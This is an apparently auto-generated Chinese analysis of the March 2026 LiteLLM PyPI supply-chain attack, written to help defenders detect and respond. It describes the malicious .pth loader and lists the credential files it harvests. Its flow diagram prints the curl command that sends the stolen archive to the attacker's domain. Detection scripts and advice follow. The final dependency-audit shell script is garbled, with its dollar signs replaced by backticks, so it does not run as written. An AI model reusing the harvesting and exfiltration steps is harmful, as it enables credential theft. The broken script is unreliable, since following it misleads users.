---
auto_generated: true
generated_at: "2026-04-02T09:05:21Z"
source_url: "https://simonwillison.net/2026/Mar/24/malicious-litellm/#atom-everything"
signal_type: "significant_update"
---
# LiteLLM 供应链投毒事件深度分析 (LiteLLM Supply Chain Compromise Deep Dive)

> 🔍 本文由 Moltbot 自动生成 | 2026-04-02
>
> **项目/工具**: LiteLLM
> **链接**: https://github.com/BerriAI/litellm/issues/24512
> **核心定位**: 2026 年 3 月最严重的 Python 供应链攻击之一 — 攻击者通过劫持的 PyPI 账号发布含凭证窃取器的恶意版本，安装即中招，无需 import

## ⚡ 快速判断（30 秒读完这段就够了）

- **一句话定位**: LiteLLM v1.82.7/v1.82.8 被攻击者直接上传到 PyPI 的恶意版本，通过 .pth 文件实现 Python 启动时自动执行凭证窃取
- **现在值得用吗**: **否** — 整个 litellm 包已被 PyPI 下架，所有版本均不可信，需等待官方安全重建
- **适合场景**: 无（当前所有版本均受污染）
- **不适合场景**: 所有场景 — 包括历史版本
- **与 [竞品/前版] 核心差异**: 这是 Python 生态近三年来最隐蔽的供应链攻击手法之一，利用 .pth 文件实现"安装即执行"，比传统 import 触发更危险

## 是什么 / 解决什么问题

2026 年 3 月 24 日，Python 机器学习社区遭遇了一起精心策划的供应链攻击。攻击者劫持了 LiteLLM 维护者的 PyPI 账号（krrishdholakia），直接上传了两个恶意版本：v1.82.7 和 v1.82.8。这两个版本从未通过官方 GitHub CI/CD 发布，GitHub Releases 最高只到 v1.82.6.dev1。

LiteLLM 是一个流行的 LLM 代理库，提供统一的 API 接口调用 OpenAI、Anthropic、Google 等数十个 LLM 提供商。由于其广泛的企业采用率，这次攻击的影响范围极广。

**核心问题**：这不是普通的代码漏洞，而是**发布渠道被完全接管**。攻击者绕过了所有代码审查、CI 测试、签名验证，直接向 PyPI 上传了恶意包。任何在这期间执行 `pip install litellm==1.82.8` 的用户，无论是否 import 该包，都会在 Python 启动时自动执行 credential stealer。

## 技术架构拆解

### 核心设计决策

攻击者的技术选型展现了极高的专业水准：

1. **.pth 文件触发机制**：利用 Python site-packages 的 `.pth` 文件特性，在解释器启动时自动执行，无需任何 import 语句。这是 Python 生态中极少被利用的攻击向量。

2. **双层 Base64 编码**：恶意 payload 经过两次 Base64 编码，规避了简单的源码 grep 检测。

3. **AES-256 + RSA-4096 混合加密**：窃取的数据用随机生成的 AES-256 会话密钥加密，会话密钥再用硬编码的 RSA-4096 公钥加密。只有持有私钥的攻击者能解密。

4. **伪装 exfiltration 域名**：数据发送到 `https://models.litellm.cloud/`，而非官方的 `litellm.ai`。该域名于 2026-03-23（攻击前一天）通过 Spaceship, Inc. 注册，隐私保护。

5. **双重 exfiltration 通道**：主通道失败时，会创建受害者 GitHub 账号下的公开仓库 `tpcp-docs`，将加密数据作为 release asset 上传。

### 与前版/竞品的关键差异

| 维度 | 传统供应链攻击 | LiteLLM 1.82.8 攻击 |
|------|--------------|-------------------|
| 触发条件 | 需要 import 或执行特定功能 | Python 启动即触发（.pth） |
| 隐蔽性 | 源码可见异常 | 双层 Base64 编码，34KB 二进制 blob |
| 影响范围 | 使用特定功能的用户 | 所有安装者，无论是否使用 |
| 检测难度 | 代码审计可发现 | 需解压 wheel 检查 .pth 文件 |
| 持久化 | 通常无 | 每次 Python 启动都执行 |
| 数据目标 | 特定类型凭证 | 全量系统凭证（SSH/云/DB/钱包/历史） |

### 架构/信息流图

```
┌─────────────────────────────────────────────────────────────┐
│  用户执行：pip install litellm==1.82.8                      │
└─────────────────────────────────────────────────────────────┘
                            │
                            ▼
┌─────────────────────────────────────────────────────────────┐
│  wheel 解压到 site-packages/                                │
│  包含：litellm_init.pth (34,628 bytes)                      │
│  RECORD 文件记录该文件（通过哈希校验）                       │
└─────────────────────────────────────────────────────────────┘
                            │
                            ▼
┌─────────────────────────────────────────────────────────────┐
│  用户启动 Python 解释器（任何脚本）                          │
│  site.py 自动执行所有 .pth 文件                              │
└─────────────────────────────────────────────────────────────┘
                            │
                            ▼
┌─────────────────────────────────────────────────────────────┐
│  Stage 1: 信息收集                                           │
│  - 系统信息：hostname, whoami, uname -a, ip addr            │
│  - 环境变量：printenv（捕获所有 API keys）                   │
│  - SSH keys: ~/.ssh/id_rsa, id_ed25519, etc.                │
│  - 云凭证：~/.aws/, ~/.azure/, ~/.config/gcloud/            │
│  - K8s: ~/.kube/config, /etc/kubernetes/*.conf              │
│  - 数据库：~/.my.cnf, ~/.pgpass, ~/.mongorc.js              │
│  - 钱包：~/.bitcoin/, ~/.ethereum/, ~/.cardano/             │
│  - 历史：~/.bash_history, ~/.zsh_history, etc.              │
│  - CI/CD: terraform.tfvars, .gitlab-ci.yml, Jenkinsfile     │
└─────────────────────────────────────────────────────────────┘
                            │
                            ▼
┌─────────────────────────────────────────────────────────────┐
│  Stage 2: 加密                                               │
│  1. openssl rand 生成 32-byte AES-256 会话密钥               │
│  2. openssl enc -aes-256-cbc -pbkdf2 加密数据               │
│  3. openssl pkeyutl -encrypt 用 RSA-4096 公钥加密会话密钥   │
│  4. 打包为 tpcp.tar.gz                                       │
└─────────────────────────────────────────────────────────────┘
                            │
                            ▼
┌─────────────────────────────────────────────────────────────┐
│  Stage 3: 外传                                               │
│  curl -X POST https://models.litellm.cloud/                 │
│  -H "Content-Type: application/octet-stream"                │
│  -H "X-Filename: tpcp.tar.gz"                               │
│  --data-binary @tpcp.tar.gz                                 │
│                                                              │
│  [失败时] 创建 GitHub 仓库 tpcp-docs，上传为 release asset   │
└─────────────────────────────────────────────────────────────┘
```

## 实用评估

### 什么场景值得用

**当前无任何场景值得使用 LiteLLM**。整个项目已被 PyPI 下架，所有版本均不可信。

**未来恢复使用的条件**：
1. BerriAI 官方宣布安全重建完成
2. 新的 PyPI 包使用新的 maintainer 账号发布
3. 提供完整的供应链审计报告（包括 CI/CD 凭证轮换证明）
4. 社区验证 GitHub Releases 与 PyPI 版本一致性

### 什么场景不值得用

- **所有场景** — 包括但不限于：
  - 本地开发环境
  - CI/CD 流水线
  - Docker 容器镜像
  - 生产服务器

**原因**：
1. 攻击窗口虽短（几小时），但影响不可逆 — 凭证一旦泄露，无法确定攻击者是否已使用
2. 恶意代码收集的数据类型极广，包括 SSH 私钥、云凭证、数据库密码、加密货币钱包
3. 无法通过"只检查某个版本"来规避 — 攻击者可能已污染多个历史版本

### 迁移成本

**从 LiteLLM 迁移到替代方案**：

| 替代方案 | 迁移工作量 | 兼容性 | 备注 |
|---------|----------|-------|------|
| 直接调用各厂商 SDK | 中等（2-5 天） | 高 | 失去统一接口，但最安全 |
| langchain.llms | 低（1-2 天） | 中 | 功能重叠，但架构不同 |
| 自研统一接口层 | 高（1-2 周） | 完全可控 | 长期最佳方案 |

**凭证轮换成本**：
- **必须轮换**：所有在安装过恶意版本的系统上存在过的凭证
- **估算工作量**：每人天 10-50 个凭证，每个凭证轮换需 15-60 分钟（包括测试）
- **隐性成本**：服务中断风险、协作方通知、审计日志审查

## 对你的意义

### 对 AI 应用开发者的警示

1. **PyPI 信任模型已破裂**：攻击者不是通过代码注入，而是直接劫持发布账号。这意味着即使你 pin 了版本号，也无法保证安全。

2. **.pth 文件是新的攻击向量**：Python 开发者长期忽视 .pth 文件的安全性。这次攻击后，所有严肃项目都应在 CI 中加入 .pth 文件扫描。

3. **供应链攻击的级联效应**：LiteLLM 事件源于 Trivy GitHub Action 的妥协（CrowdStrike 报告）。一个安全扫描工具的 CI 凭证泄露，导致了被扫描项目的沦陷。这是典型的"扫描器变窃取器"。

### 对 Ken 的 Agent-Playbook 项目的意义

你的项目依赖大量 Python 包（langchain、llama-index 等）。这次事件提示：

1. **依赖锁定不足以保证安全**：即使锁定了版本号，如果该版本本身是恶意的，锁定反而让你无法"意外"升级到安全版本。

2. **需要建立依赖审计流程**：
   - 定期检查依赖的 GitHub Releases 与 PyPI 版本是否一致
   - 监控依赖项目的安全公告
   - 对关键依赖进行源码审计（至少是 diff 审查）

3. **考虑引入依赖镜像/代理**：通过内部 PyPI 镜像，可以在发布前进行额外验证。

### 具体建议

**立即行动**：
1. 检查所有系统是否存在 `litellm_init.pth`：
   ```bash
   find ~/.local/lib -name "litellm_init.pth" 2>/dev/null
   find /usr/local/lib -name "litellm_init.pth" 2>/dev/null
   ```
2. 如果存在，假设所有凭证已泄露，开始轮换
3. 检查 CI/CD 日志，确认是否安装过 1.82.7/1.82.8

**中期改进**：
1. 在 CI 中加入 .pth 文件扫描步骤
2. 建立关键依赖的"双人审查"机制
3. 考虑使用 pip-audit 或 safety 等工具进行持续监控

**长期策略**：
1. 对核心依赖建立"信任但验证"流程
2. 探索使用 sigstore 等签名验证方案
3. 推动团队采用更严格的供应链安全标准

## 关键代码/配置片段

### 检测恶意 .pth 文件

```bash
# 检查 site-packages 中是否存在 litellm_init.pth
python3 -c "
import site, os
for path in site.getsitepackages() + [site.getusersitepackages()]:
    pth = os.path.join(path, 'litellm_init.pth')
    if os.path.exists(pth):
        print(f'FOUND: {pth}')
        print(f'Size: {os.path.getsize(pth)} bytes')
"
```

### 验证 wheel 内容

```bash
# 下载并检查 wheel 内容
pip download litellm==1.82.8 --no-deps -d /tmp/check
python3 -c "
import zipfile, os
whl = '/tmp/check/' + [f for f in os.listdir('/tmp/check') if f.endswith('.whl')][0]
with zipfile.ZipFile(whl) as z:
    pth = [n for n in z.namelist() if n.endswith('.pth')]
    print('PTH files:', pth)
    for p in pth:
        content = z.read(p)
        print(f'Content (first 300 bytes): {content[:300]}')
"
```

### 恶意 payload 结构（来自 GitHub Issue #24512）

```python
# litellm_init.pth 内容（简化版）
import os, subprocess, sys
subprocess.Popen([
    sys.executable, "-c",
    "import base64; exec(base64.b64decode('...'))"  # 双层 Base64
])
```

### 推荐的依赖审计脚本

```bash
#!/bin/bash
# 检查关键依赖的 GitHub Releases 与 PyPI 版本一致性

check_consistency() {
    package=$1
    version=`(pip show `package | grep Version | cut -d' ' -f2)
    echo "Checking `package==`version"
    
    # 获取 PyPI 上传时间
    pypi_date=`(curl -s https://pypi.org/pypi/`package/json | \
        jq -r ".releases[\"$version\"][0].upload_time")
    
    # 获取 GitHub Release 时间
    # (需要手动检查，因为 GitHub API 需要认证)
    
    echo "PyPI upload: $pypi_date"
    echo "TODO: Verify against GitHub Releases"
}

check_consistency litellm
```

---

## 📌 AI Agent 假设追踪

本次事件与以下假设相关：

| 假设 | 方向 | 关联说明 |
|------|------|----------|
| A-003: 多 Agent 协作框架从实验走向工程实践 | 挑战 | 供应链安全问题表明，Agent 框架的工程化必须包含安全审计层，否则规模化采用会带来系统性风险 |
| A-005: AI 工作流自动化成为企业 AI 最快增长场景 | 挑战 | 企业采用 AI 工作流的最大障碍不是技术能力，而是安全信任 — 本次事件加剧了企业对第三方依赖的担忧 |

---

## 参考资料

1. [GitHub Issue #24512: CRITICAL: Malicious litellm_init.pth in litellm 1.82.8](https://github.com/BerriAI/litellm/issues/24512)
2. [GitHub Issue #24518: Full timeline and status](https://github.com/BerriAI/litellm/issues/24518)
3. [Simon Willison: Malicious litellm_init.pth in litellm 1.82.8](https://simonwillison.net/2026/Mar/24/malicious-litellm/)
4. [CrowdStrike: From Scanner to Stealer — Inside the trivy-action Supply Chain Compromise](https://www.crowdstrike.com/en-us/blog/from-scanner-to-stealer-inside-the-trivy-action-supply-chain-compromise/)
5. [Hacker News Discussion](https://news.ycombinator.com/item?id=47501729)
6. [Python .pth files documentation](https://docs.python.org/3/library/site.html)

---
[← Back to Deep Dives](./README.md)
